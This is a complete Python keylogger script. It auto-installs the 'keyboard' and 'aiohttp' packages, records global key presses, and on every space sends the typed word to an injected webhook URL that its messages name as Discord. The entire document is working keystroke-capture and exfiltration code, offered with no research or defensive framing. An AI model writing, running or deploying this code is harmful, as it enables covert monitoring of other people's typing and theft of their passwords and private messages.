# 1 Auto-install keyboard + aiohttp if not present
import subprocess
import sys
import threading

for module in ["keyboard", "aiohttp", "asyncio"]:
    try:
        __import__(module)
    except ImportError:
        print(f"{module} module not found. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module])

import keyboard
import asyncio
import aiohttp

# 2 Webhook URL (must be provided externally)
WEBHOOK_URL = WEBHOOK  # this will fail if WEBHOOK is not injected

# 3 Typing capture logic
typed_text = ""

#  Create loop and run it in background
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

def run_loop():
    loop.run_forever()

threading.Thread(target=run_loop, daemon=True).start()

async def send_to_webhook(text):
    async with aiohttp.ClientSession() as session:
        payload = {
            "content": f"User typed: `{text}`"
        }
        async with session.post(WEBHOOK_URL, json=payload) as response:
            if response.status not in (200, 204):
                print(f"Failed to send webhook: {response.status}")

def on_key(event):
    global typed_text
    if event.name == "space":
        if typed_text.strip():
            asyncio.run_coroutine_threadsafe(send_to_webhook(typed_text), loop)
            print(f"Sent: {typed_text}")  # Debug log
        typed_text = ""
    elif len(event.name) == 1:
        typed_text += event.name

keyboard.on_press(on_key)

print("Start typing! Words will be sent to Discord when you press SPACE. Press ESC to quit.")
keyboard.wait('esc')
